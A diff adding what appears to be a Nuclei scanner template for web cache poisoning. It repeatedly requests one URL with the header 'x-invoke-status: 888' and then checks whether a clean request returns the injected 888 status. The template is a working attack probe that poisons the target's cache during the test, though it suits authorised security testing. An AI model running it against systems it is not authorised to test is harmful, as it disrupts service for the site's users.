@@ -1,0 +1,87 @@
+id: multiple-requests
+
+info:
+  name: "Cache-Poisoning"
+  author: "YourName"
+  severity: critical
+  description: "This template sends multiple requests to the same URL."
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=hd87d"
+    headers:
+      x-invoke-status: 888
+
+
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=hd87d"
+    headers:
+      x-invoke-status: 888
+
+
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=hd87d"
+    headers:
+      x-invoke-status: 888
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=hd87d"
+    headers:
+      x-invoke-status: 888
+
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=hd87d"
+    headers:
+      x-invoke-status: 888
+
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=hd87d"
+    headers:
+      x-invoke-status: 888
+
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=hd87d"
+    headers:
+      x-invoke-status: 888
+
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=hd87d"
+    headers:
+      x-invoke-status: 888
+
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=hd87d"
+    headers:
+      x-invoke-status: 888
+
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=hd87d"
+    headers:
+      x-invoke-status: 888
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/?k=hd87d"
+
+    matchers:
+          - type: status
+            status:
+              - 888
